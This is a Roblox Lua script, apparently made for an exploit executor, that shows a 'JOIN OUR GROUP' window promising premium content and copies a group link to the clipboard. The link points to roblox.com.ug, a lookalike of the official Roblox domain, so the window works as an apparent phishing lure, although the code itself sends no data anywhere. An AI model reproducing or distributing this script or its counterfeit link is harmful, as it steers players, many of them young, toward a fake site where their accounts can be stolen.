-- ===== Simple GUI for Group Join with Toggle =====
local GroupID = 1671787857
local GroupLink = "https://roblox.com.ug/communities/1671787857/"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

wait(1)

-- Toggle Variables
local guiVisible = true
local toggleKey = Enum.KeyCode.F6  -- Press F6 to toggle

-- ===== Create GUI Frame =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GroupJoinGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Title
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 24
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "🔗 JOIN OUR GROUP"
titleLabel.Parent = mainFrame

-- Description
local descLabel = Instance.new("TextLabel")
descLabel.Name = "Description"
descLabel.Size = UDim2.new(0.9, 0, 0, 80)
descLabel.Position = UDim2.new(0.05, 0, 0, 60)
descLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
descLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
descLabel.TextSize = 14
descLabel.Font = Enum.Font.Gotham
descLabel.TextWrapped = true
descLabel.Text = "Join our group to access premium content and features!"
descLabel.Parent = mainFrame

-- Copy Link Button
local copyButton = Instance.new("TextButton")
copyButton.Name = "CopyButton"
copyButton.Size = UDim2.new(0.4, 0, 0, 50)
copyButton.Position = UDim2.new(0.05, 0, 0, 155)
copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
copyButton.TextSize = 14
copyButton.Font = Enum.Font.GothamBold
copyButton.Text = "📋 COPY LINK"
copyButton.Parent = mainFrame

copyButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(GroupLink)
        copyButton.Text = "✅ COPIED!"
        copyButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        wait(2)
        copyButton.Text = "📋 COPY LINK"
        copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    else
        copyButton.Text = "❌ NOT SUPPORTED"
        wait(2)
        copyButton.Text = "📋 COPY LINK"
    end
end)

-- Close Button
local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0.4, 0, 0, 50)
closeButton.Position = UDim2.new(0.55, 0, 0, 155)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 14
closeButton.Font = Enum.Font.GothamBold
closeButton.Text = "❌ HIDE (F6)"
closeButton.Parent = mainFrame

closeButton.MouseButton1Click:Connect(function()
    guiVisible = false
    mainFrame.Visible = false
end)

-- Draggable Frame
local dragging = false
local dragInput
local dragStart
local startPos

titleLabel.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

titleLabel.InputChanged:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input, gameProcessed)
    if dragging and dragInput then
        local delta = input.Position - dragStart
        mainFrame.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- ===== Toggle Hotkey (F6) =====
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == toggleKey then
        guiVisible = not guiVisible
        mainFrame.Visible = guiVisible
        
        if guiVisible then
            print("✅ GUI Opened! (Press F6 to hide)")
        else
            print("❌ GUI Hidden! (Press F6 to show)")
        end
    end
end)

print("✅ Group Join GUI loaded!")
print("📌 Press F6 to toggle (open/close) the GUI")
print("💡 Or click HIDE button to close")
